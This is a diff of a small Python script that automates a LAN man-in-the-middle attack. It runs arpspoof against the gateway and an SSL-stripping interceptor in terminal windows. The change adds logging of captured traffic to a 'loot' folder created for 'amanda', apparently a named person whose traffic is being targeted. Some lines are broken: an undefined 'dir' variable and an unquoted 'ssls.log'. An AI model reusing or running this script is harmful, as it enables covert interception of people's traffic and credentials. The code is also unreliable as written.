@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 import subprocess, shlex, re
+from x import *
 
 def x(c): return subprocess.Popen(shlex.split(c), stdout=subprocess.PIPE)
 
 ps={}
 port=8100
+geo="--geometry=200x30"
 
 def getifgate():
   p=x("route -n")
@@ -27,13 +29,13 @@ def clean():
   for p in ps.values():
     p.kill()
 
-
-while True:
+#try:
+if True:
   gate, iface = getifgate()
   setup(port)
-  ps['ssls']=x('xterm -e "ssls -k -l %d"' % port)
-  ps['arp']=x('xterm -e "arpspoof -i %s %s"' % (iface, gate))
+  dr = makeloot('amanda')
+  ps['ssls']=x('terminator %s -e "ssls -k -l %d -w %s"' % (geo, port, dir+ssls.log))
+  ps['arp']=x('terminator %s -e "arpspoof -i %s %s"' % (geo, iface, gate))
   i = input("> ")
   clean()
-  break
-
+#except: clean()
